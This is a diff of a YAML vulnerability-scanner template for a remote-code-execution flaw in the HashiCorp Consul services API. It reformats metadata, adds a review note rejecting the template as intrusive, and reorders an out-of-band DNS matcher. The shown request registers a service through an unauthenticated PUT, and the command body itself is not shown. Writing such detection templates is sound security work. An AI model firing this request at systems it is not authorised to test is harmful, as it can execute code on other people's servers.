@@ -1,5 +1,4 @@
 id: hashicorp-consul-rce
-
 info:
   name: Hashicorp Consul Services API - Remote Code Execution
   author: pikpikcu
@@ -10,15 +9,19 @@ info:
   classification:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
     cvss-score: 10
-    cwe-id: CWE-77
+    cwe-id: CWE-77,CWE-78
   metadata:
     runzero-review: REJECT/2025-11-07/excluding tag intrusive, uses interactsh
     max-request: 1
-  tags: hashicorp,rce,oast,intrusive,edb,vuln
-
+  tags: edb,hashicorp,intrusive,oast,rce,vuln
 http:
-  - raw:
-      - | # Create USER
+  - matchers:
+      - part: interactsh_protocol
+        type: word
+        words:
+          - dns
+    raw:
+      - |
         PUT /v1/agent/service/register HTTP/1.1
         Host: {{Hostname}}
 
@@ -33,10 +36,3 @@ http:
             "Timeout": "86400s"
           }
         }
-
-    matchers:
-      - type: word
-        part: interactsh_protocol # Confirms the DNS Interaction
-        words:
-          - "dns"
-
